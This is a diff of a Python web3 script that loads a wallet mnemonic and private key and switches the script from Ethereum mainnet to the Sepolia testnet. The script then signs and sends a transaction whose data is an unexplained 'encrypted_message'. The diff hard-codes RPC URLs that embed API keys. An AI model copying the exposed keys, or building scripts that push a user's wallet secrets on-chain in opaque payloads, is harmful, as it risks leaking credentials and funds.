@@ -19,9 +19,9 @@ if len(mnemonic_words) not in [12, 24]:
 
 print("私钥已成功加载。")
 
-# 配置Ethereum节点
-ETH_url = 'https://eth-mainnet.g.alchemy.com/v2/KEGJ3Gr9ORW_w5a0iNvW20PS9eRbKj3X'
-web3 = Web3(Web3.HTTPProvider(ETH_url))
+# 配置Sepolia节点
+sepolia_url = 'https://withered-patient-glade.ethereum-sepolia.quiknode.pro/0155507fe08fe4d1e2457a85f65b4bc7e6ed522f'
+web3 = Web3(Web3.HTTPProvider(sepolia_url))
 
 # 检查连接
 if not web3.is_connected():
@@ -44,12 +44,10 @@ else:
 contract_address = os.getenv("CA")
 
 if not contract_address:
-    print("错误：未能载入合约地址！")
-    exit()
+    print("错误：未能载入合约地址，请检查！")
 else:
     print("成功载入代币合约地址:", contract_address)
 
-# 使用正确的 contract_address
 try:
     router_address = get_dex_router_contract(contract_address)
 except NameError:
@@ -77,11 +75,11 @@ tx = {
     'gas': 2000000,
     'gasPrice': web3.to_wei('20', 'gwei'),  
     'data': web3.to_hex(text=encrypted_message),
-    'chainId': 1    
+    'chainId': 11155111    
 }
 
 # 签署并发送交易
 signed_tx = web3.eth.account.sign_transaction(tx, private_key)
 tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
 
-print(f"交易完成，交易哈希为：{web3.to_hex(tx_hash)}")
+print(f"交易哈希为：{web3.to_hex(tx_hash)}")
